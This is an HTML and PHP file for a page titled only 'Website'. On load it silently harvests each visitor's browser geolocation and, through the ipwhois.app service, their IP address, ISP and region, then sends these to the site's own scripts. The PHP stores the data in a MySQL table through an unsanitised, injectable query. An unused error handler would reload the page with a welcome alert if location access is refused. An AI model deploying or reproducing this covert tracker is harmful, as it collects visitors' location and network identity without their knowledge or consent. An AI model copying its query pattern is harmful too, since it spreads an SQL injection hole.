<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="utf-8">
    <title>Website</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
    </script>
</head>

<body onload="getLocation();">
    <a href="data.php">Data</a>

    <div class="location">
        <input type="text" name="latitude" value="" id="en" onkeyup="GetValue(this.value)">
        <input type="text" name="longitude" value="" id="uz">
    </div>
    <script type="text/javascript">
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        }
    }

    function showPosition(position) {
        document.querySelector('.location input[name="latitude"]').value = position.coords.latitude;
        document.querySelector('.location input[name="longitude"]').value = position.coords.longitude;
        var valuen = document.getElementById('en').value;
        var valueuz = document.getElementById('uz').value;
        console.log(valuen,valueuz);
        var myBlob = new Blob(
            [valuen,valueuz], {
                type: "text/plain"
            }
        );

        var data = new FormData();
        data.append('upFile', myBlob);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", 'upload.php');
        xhr.onload = function() {

        };
        xhr.send(data);
    }
function showError(error){
    switch(error.code){
        case error.PERMISSION_DENIED:
            alert('Xos gelmisiz');
            location.reload();
            break;
    }
}

    </script>
   
    <script type="text/javascript">
    $.getJSON('https://ipwhois.app/json/', function(ip) {
        var data = {
            ip: ip.ip,
            isp: ip.org,
            country: ip.country,
            city: ip.region,
            latitude: ip.latitude,
            longitude: ip.longitude
        };

        $.ajax({
            url: 'index.php',
            type: 'post',
            data: data
        })
    })
    </script>
</body>

</html>
<?php
require 'config.php';
if (isset($_POST["ip"])) {
    $ip = $_POST["ip"];
    $isp = $_POST["isp"];
    $country = $_POST["country"];
    $city = $_POST["city"];
    $latitude = $_POST["latitude"];
    $longitude = $_POST["longitude"];

    $query = "INSERT INTO tb_data VALUES('', '$ip', '$isp', '$country', '$city','$latitude','$longitude')";
    mysqli_query($conn, $query);
}
?>